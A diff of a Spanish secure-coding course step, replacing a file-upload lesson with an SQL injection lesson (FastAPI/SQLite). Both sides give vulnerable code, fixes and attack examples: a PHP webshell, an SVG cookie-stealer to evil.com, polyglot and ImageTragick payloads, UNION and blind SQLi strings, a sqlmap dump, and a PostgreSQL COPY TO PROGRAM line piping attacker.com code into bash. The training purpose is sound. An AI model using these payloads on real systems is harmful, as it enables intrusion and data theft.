@@ -1,286 +1,206 @@
-# Paso 20 — Insecure File Upload
-**Tecnologia:** TypeScript / NestJS | **OWASP:** A04:2021 - Insecure Design / A01:2021 | **CWE-434**
+# Paso 21 — SQL Injection
+**Tecnologia:** Python / FastAPI + SQLite | **OWASP:** A03:2021 - Injection | **CWE-89**
 
 ---
 
 ## Que es esta vulnerabilidad?
 
-Insecure File Upload ocurre cuando una aplicacion acepta archivos del usuario sin validar correctamente el tipo, el tamano, el contenido o el nombre del archivo. Las consecuencias pueden incluir:
+SQL Injection es posiblemente la vulnerabilidad mas conocida y mas explotada de la historia de la seguridad web. Ocurre cuando input del usuario se concatena directamente en una consulta SQL, permitiendo al atacante modificar la estructura de la query.
 
-- **RCE (Remote Code Execution):** subir un archivo `.php`, `.jsp` o `.py` en un servidor que ejecuta scripts, y luego acceder a el via URL para ejecutar codigo.
-- **Path Traversal via nombre:** subir un archivo con nombre `../../etc/cron.d/backdoor` que se guarda fuera del directorio previsto.
-- **XSS via SVG/HTML:** subir un archivo SVG con JavaScript embebido que se ejecuta en el navegador de otros usuarios.
-- **DoS por disco lleno:** subir archivos de tamano arbitrario hasta agotar el espacio en disco del servidor.
-- **Malware hosting:** usar el servidor como repositorio de malware que se sirve a terceros.
+Bases de datos relacionales como SQLite, PostgreSQL, MySQL, Microsoft SQL Server y Oracle usan SQL como lenguaje de consulta. Todas son vulnerables a SQL Injection cuando las consultas se construyen con concatenacion de strings en lugar de parametros preparados.
+
+El impacto va desde lectura de datos confidenciales (dump completo de la base de datos) hasta modificacion y borrado de datos, bypass de autenticacion, y en algunas configuraciones de MSSQL y PostgreSQL, ejecucion de comandos del sistema operativo via `xp_cmdshell` o `COPY TO/FROM PROGRAM`.
 
 ---
 
 ## Donde ocurre en este codigo?
 
-**Archivo:** `src/typescript/src/upload.controller.ts`
+**Archivo:** `src/python/routes/users.py`
 
-```typescript
-// CODIGO VULNERABLE — estado actual del ejercicio
-@Controller('files')
-export class UploadController {
-  @Post('/upload')
-  @UseInterceptors(FileInterceptor('file'))
-  upload(@UploadedFile() file: Express.Multer.File): { filename: string } {
-    return { filename: file.originalname };  // nombre original del usuario, sin validacion
-  }
-}
+```python
+# CODIGO VULNERABLE — estado actual del ejercicio
+@router.get("/users")
+async def get_user(username: str):
+    conn = sqlite3.connect(":memory:")
+    cursor = conn.execute(
+        f"SELECT id, username, email FROM users WHERE username = '{username}'"
+    )
+    rows = cursor.fetchall()
+    conn.close()
+    return {"users": rows}
 ```
 
-Problemas:
-1. **Sin validacion de MIME type ni extension:** se acepta cualquier tipo de archivo
-2. **Sin limite de tamano:** el archivo puede ser de cualquier tamano
-3. **Se retorna `file.originalname`:** el nombre original del atacante se devuelve y potencialmente se usa para guardar el archivo
-4. **Sin generacion de nombre seguro:** si el archivo se guarda con el nombre original, hay path traversal
+Con `username = "alice"`, la query es:
+```sql
+SELECT id, username, email FROM users WHERE username = 'alice'
+```
+
+Con `username = "' OR '1'='1"`, la query se convierte en:
+```sql
+SELECT id, username, email FROM users WHERE username = '' OR '1'='1'
+```
+La condicion `'1'='1'` siempre es verdadera, devolviendo todos los registros.
 
 ---
 
 ## Como lo explotaria un atacante
 
-**Subida de webshell PHP:**
-```bash
-# Crear una webshell PHP
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-curl -X POST /files/upload -F 'file=@shell.php'
-# Si el servidor sirve el directorio de uploads como estatico:
-curl 'https://app.empresa.com/uploads/shell.php?cmd=id'
-# El servidor ejecuta: uid=33(www-data)
+**Dump de tabla completa (bypass de filtro WHERE):**
+```
+GET /users?username=' OR '1'='1
 ```
 
-**Path traversal via nombre de archivo:**
+**UNION-based: extraer datos de otra tabla:**
+```
+GET /users?username=' UNION SELECT null, username, password FROM admin_users--
+```
+Extrae usuarios y contrasenas de la tabla `admin_users`.
+
+**Blind SQL Injection (inferencia por tiempo):**
+```
+GET /users?username=' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM (SELECT SLEEP(5))x) END)='1
+```
+Si la condicion es verdadera, el servidor responde inmediatamente. Si es falsa, tarda 5 segundos. Permite extraer datos bit a bit sin ver la respuesta directa.
+
+**Herramientas automatizadas:**
 ```bash
-# El cliente puede controlar el nombre del archivo
-curl -X POST /files/upload \
-  -F 'file=@evil.sh;filename=../../../../etc/cron.d/backdoor'
-# Si el servidor guarda con el nombre original: sobrescribe el cron
+sqlmap -u "http://target/users?username=alice" --dbs --dump
+# sqlmap detecta la inyeccion y extrae el esquema y datos completos automaticamente
 ```
 
-**XSS via SVG:**
-```xml
-<!-- evil.svg -->
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>document.location='https://evil.com/steal?c='+document.cookie</script>
-</svg>
-```
-```bash
-curl -X POST /files/upload -F 'file=@evil.svg'
-# Si otro usuario accede a la URL del archivo SVG, el JS se ejecuta en su navegador
-```
-
-**DoS por disco lleno:**
-```bash
-# Crear un archivo de 10GB y subirlo
-dd if=/dev/urandom of=bigfile bs=1M count=10000
-curl -X POST /files/upload -F 'file=@bigfile'
-# El disco del servidor se llena, el servicio cae
+**En PostgreSQL: RCE via COPY:**
+```sql
+'; COPY (SELECT '') TO PROGRAM 'curl https://attacker.com/shell.sh | bash' --
 ```
 
 ---
 
 ## Tu tarea: aplicar la mitigacion
 
-Modifica `src/typescript/src/upload.controller.ts` para validar tipo, tamano y generar un nombre seguro:
+Modifica `src/python/routes/users.py` para usar consultas parametrizadas:
 
-```typescript
-// CODIGO SEGURO
-import {
-  Controller, Post, UploadedFile, UseInterceptors, BadRequestException
-} from '@nestjs/common';
-import { FileInterceptor } from '@nestjs/platform-express';
-import { randomUUID } from 'crypto';
-import * as path from 'path';
+```python
+# CODIGO SEGURO
+import sqlite3
+from fastapi import APIRouter
 
-// Tipos MIME permitidos (lista blanca, no lista negra)
-const ALLOWED_MIME_TYPES = new Set([
-  'image/jpeg',
-  'image/png',
-  'image/gif',
-  'image/webp',
-  'application/pdf',
-]);
+router = APIRouter()
 
-// Extensiones permitidas (mapeadas desde MIME)
-const ALLOWED_EXTENSIONS = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf']);
-
-// Limite de tamano: 5 MB
-const MAX_FILE_SIZE = 5 * 1024 * 1024;
-
-@Controller('files')
-export class UploadController {
-  @Post('/upload')
-  @UseInterceptors(FileInterceptor('file', {
-    limits: { fileSize: MAX_FILE_SIZE },  // limite de tamano en multer
-  }))
-  upload(@UploadedFile() file: Express.Multer.File): { filename: string } {
-    if (!file) {
-      throw new BadRequestException('No se recibio ningun archivo');
-    }
-
-    // Validar MIME type reportado por multer
-    if (!ALLOWED_MIME_TYPES.has(file.mimetype)) {
-      throw new BadRequestException(`Tipo de archivo no permitido: ${file.mimetype}`);
-    }
-
-    // Validar extension del nombre original
-    const ext = path.extname(file.originalname).toLowerCase();
-    if (!ALLOWED_EXTENSIONS.has(ext)) {
-      throw new BadRequestException(`Extension no permitida: ${ext}`);
-    }
-
-    // Validar tamano (aunque multer ya limita, verificacion adicional)
-    if (file.size > MAX_FILE_SIZE) {
-      throw new BadRequestException('Archivo demasiado grande');
-    }
-
-    // Generar nombre aleatorio: evita path traversal y colisiones
-    const safeFilename = `${randomUUID()}${ext}`;
-
-    // Aqui se guardaria el archivo con safeFilename, no con file.originalname
-    // fs.writeFileSync(path.join('/var/uploads', safeFilename), file.buffer);
-
-    return { filename: safeFilename };
-  }
-}
+@router.get("/users")
+async def get_user(username: str):
+    conn = sqlite3.connect(":memory:")
+    # El ? es un placeholder: sqlite3 serializa el valor de forma segura
+    # El input del usuario NUNCA toca el texto de la query SQL
+    cursor = conn.execute(
+        "SELECT id, username, email FROM users WHERE username = ?",
+        (username,)
+    )
+    rows = cursor.fetchall()
+    conn.close()
+    return {"users": rows}
 ```
 
 ### Por que funciona esta mitigacion?
 
-- **`ALLOWED_MIME_TYPES` (allowlist):** en lugar de bloquear tipos peligrosos (lista negra, facil de evadir), solo se permiten los tipos estrictamente necesarios. Un archivo `.php` tiene MIME `application/x-php` o `text/plain`, ninguno en la lista.
-- **`ALLOWED_EXTENSIONS` (allowlist):** validacion de extension adicional. Un archivo `shell.php.jpg` tendra extension `.jpg`, pero `file.mimetype` sera `application/x-php`, fallando la validacion de MIME.
-- **`randomUUID()`:** el nombre del archivo almacenado es un UUID aleatorio. No hay relacion con el nombre original del atacante. Previene path traversal y sobreescritura de archivos existentes.
-- **`limits: { fileSize: MAX_FILE_SIZE }`:** multer rechaza el archivo antes de procesarlo completo si supera el limite, previniendo DoS por disco.
+- **Consultas parametrizadas:** el driver de base de datos recibe la query y los parametros por separado. La query `SELECT ... WHERE username = ?` es compilada primero por el motor SQL. El valor `(username,)` se envia como dato opaco, nunca como parte del texto SQL.
+- **Sin interpretacion posible:** incluso si `username = "' OR '1'='1"`, el motor SQL busca literalmente un usuario llamado `' OR '1'='1` en la columna `username`. El apostrofo no tiene significado especial porque no forma parte del texto SQL.
+- **Aplica a todos los RDBs:** `?` en SQLite/MySQL, `$1` en PostgreSQL, `:param` en Oracle. La tecnica es la misma en todos.
 
 ---
 
-## Variantes de la misma categoria (Insecure Design / Upload — mas complejas)
+## Variantes de la misma categoria (SQL Injection — distintas bases de datos)
 
-### Variante A: Polyglot Files (archivos que son validos en dos formatos)
+### Variante A: Second-Order SQL Injection (datos seguros al guardar, inseguros al usar)
 
-Un archivo polyglot es valido en dos formatos simultaneamente. Por ejemplo, un archivo puede ser tanto un JPEG valido como un PHP ejecutable:
+```python
+# VULNERABLE — registro seguro, pero uso posterior inseguro
+@router.post("/register")
+async def register(username: str, password: str):
+    # Primer insert parametrizado — parece seguro
+    conn.execute("INSERT INTO users (username) VALUES (?)", (username,))
 
-```bash
-# Crear un polyglot JPEG/PHP
-# El JPEG magic bytes al inicio satisfacen la validacion de imagen
-# El codigo PHP al final se ejecuta si el servidor lo procesa como PHP
-printf '\xff\xd8\xff\xe0' > polyglot.jpg  # magic bytes de JPEG
-echo '<?php system($_GET["cmd"]); ?>' >> polyglot.jpg
-
-# file polyglot.jpg: JPEG image data
-# Si se sube como imagen y se ejecuta como PHP: RCE
+@router.get("/profile")
+async def profile(username: str):
+    # Recupera el username de la DB (parece "seguro" porque vino de la DB)
+    user = conn.execute("SELECT username FROM users WHERE username = ?", (username,)).fetchone()
+    # Construye nueva query concatenando el valor de la DB — INSEGURO
+    logs = conn.execute(
+        f"SELECT * FROM audit_logs WHERE user = '{user[0]}'"  # Second-order injection
+    ).fetchall()
 ```
 
-```typescript
-// MITIGACION ADICIONAL: verificar magic bytes del contenido real
-import * as fileType from 'file-type';
+El atacante registra el username `admin'--`. Este se almacena en la DB. Cuando la segunda query lo usa sin parametrizar, inyecta SQL aunque el dato "vino de la base de datos".
 
-async uploadSecure(file: Express.Multer.File) {
-  const type = await fileType.fromBuffer(file.buffer);
-  if (!type || !ALLOWED_MIME_TYPES.has(type.mime)) {
-    throw new BadRequestException('Contenido del archivo no coincide con el tipo declarado');
-  }
-  // file-type lee los magic bytes reales del buffer, no el MIME del cliente
-}
-```
-
----
-
-### Variante B: ImageMagick / FFmpeg procesamiento de archivos maliciosos (ImageTragick)
-
-```typescript
-// VULNERABLE — procesar imagenes sin validar el contenido
-@Post('/resize')
-async resizeImage(file: Express.Multer.File) {
-  // ImageMagick < 6.9.3-9 procesaba directivas MVG/SVG que ejecutaban comandos
-  await execFile('convert', [file.path, '-resize', '100x100', output]);
-}
-```
-
-Un archivo con extension `.jpg` pero contenido MVG:
-```
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://example.com/"|id > /tmp/rce")'
-pop graphic-context
-```
-
-```typescript
-// SEGURO — usar sharp (libreria nativa Node.js sin dependencia de ImageMagick)
-import sharp from 'sharp';
-
-@Post('/resize')
-async resizeImage(file: Express.Multer.File) {
-  const output = path.join('/var/uploads', randomUUID() + '.jpg');
-  await sharp(file.buffer)
-    .resize(100, 100)
-    .jpeg({ quality: 80 })
-    .toFile(output);  // sharp rechaza archivos que no son imagenes validas
-  return { filename: path.basename(output) };
-}
+```python
+# SEGURO — parametrizar TODAS las queries, incluyendo con datos de la propia DB
+logs = conn.execute(
+    "SELECT * FROM audit_logs WHERE user = ?", (user[0],)
+).fetchall()
 ```
 
 ---
 
-### Variante C: Upload a almacenamiento en la nube sin politica de acceso
+### Variante B: ORM con raw queries — SQLAlchemy
 
-```typescript
-// VULNERABLE — subir a S3 con ACL public-read sin validacion
-async uploadToS3(file: Express.Multer.File) {
-  await s3.upload({
-    Bucket: 'empresa-uploads',
-    Key: file.originalname,  // nombre controlado por el atacante
-    Body: file.buffer,
-    ACL: 'public-read',      // cualquiera en internet puede descargarlo
-    ContentType: file.mimetype,  // MIME reportado por el cliente, no verificado
-  }).promise();
-  return { url: `https://empresa-uploads.s3.amazonaws.com/${file.originalname}` };
-}
+```python
+# VULNERABLE — SQLAlchemy raw query con f-string
+from sqlalchemy import text
+
+@router.get("/orders")
+async def get_orders(status: str, db: Session = Depends(get_db)):
+    result = db.execute(text(f"SELECT * FROM orders WHERE status = '{status}'"))
+    return result.fetchall()
 ```
 
-```typescript
-// SEGURO — nombre generado, ACL privada, MIME verificado
-async uploadToS3(file: Express.Multer.File) {
-  const detectedType = await fileType.fromBuffer(file.buffer);
-  if (!detectedType || !ALLOWED_MIME_TYPES.has(detectedType.mime)) {
-    throw new BadRequestException('Tipo de archivo no valido');
-  }
-  const safeKey = `uploads/${randomUUID()}${path.extname(file.originalname).toLowerCase()}`;
-  await s3.upload({
-    Bucket: 'empresa-uploads',
-    Key: safeKey,
-    Body: file.buffer,
-    ACL: 'private',              // no publico por defecto
-    ContentType: detectedType.mime,  // MIME verificado del contenido real
-  }).promise();
-  // Devolver una URL pre-firmada con expiracion, no la URL publica
-  const signedUrl = await s3.getSignedUrlPromise('getObject', {
-    Bucket: 'empresa-uploads',
-    Key: safeKey,
-    Expires: 3600,  // URL valida por 1 hora
-  });
-  return { url: signedUrl };
-}
+```python
+# SEGURO — SQLAlchemy parametrizado con :param
+@router.get("/orders")
+async def get_orders(status: str, db: Session = Depends(get_db)):
+    result = db.execute(
+        text("SELECT * FROM orders WHERE status = :status"),
+        {"status": status}
+    )
+    return result.fetchall()
+
+# AUN MEJOR — usar el ORM de SQLAlchemy que parametriza automaticamente
+@router.get("/orders/v2")
+async def get_orders_v2(status: str, db: Session = Depends(get_db)):
+    return db.query(Order).filter(Order.status == status).all()
 ```
+
+---
+
+### Variante C: SQL Injection en PostgreSQL via COPY y pg_read_file
+
+```sql
+-- En PostgreSQL con privilegios de superuser, SQLi puede derivar en RCE
+'; SELECT pg_read_file('/etc/passwd', 0, 1000000) --
+-- Lee el archivo /etc/passwd del servidor
+
+'; COPY users TO '/tmp/dump.csv' --
+-- Exporta la tabla users a un archivo accesible
+
+'; CREATE TABLE cmd_exec(cmd_output TEXT);
+COPY cmd_exec FROM PROGRAM 'id' --
+-- Ejecuta comandos del sistema operativo
+```
+
+La mitigacion es la misma: consultas parametrizadas + principio de minimo privilegio (el usuario de la DB no debe ser superuser).
 
 ---
 
 ## Referencias
 
-- [OWASP A04:2021 - Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
-- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
-- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
-- [CVE-2016-3714 - ImageTragick](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714)
+- [OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
+- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
+- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [CVE-2023-20887 - SQLi en VMware Aria Operations](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-20887)
 
 ---
 
 ## Lo que valida el workflow automaticamente
 
-El workflow **Validate Step 20** exige que `src/typescript/src/upload.controller.ts` contenga:
-- `ALLOWED_MIME_TYPES`
-- `ALLOWED_EXTENSIONS`
-- `randomUUID`
-- `fileSize`
-- La ausencia de `return { filename: file.originalname }`
+El workflow **Validate Step 21** exige que `src/python/routes/users.py` contenga:
+- `"SELECT id, username, email FROM users WHERE username = ?"`
+- `(username,)`
+- La ausencia de `f"SELECT`
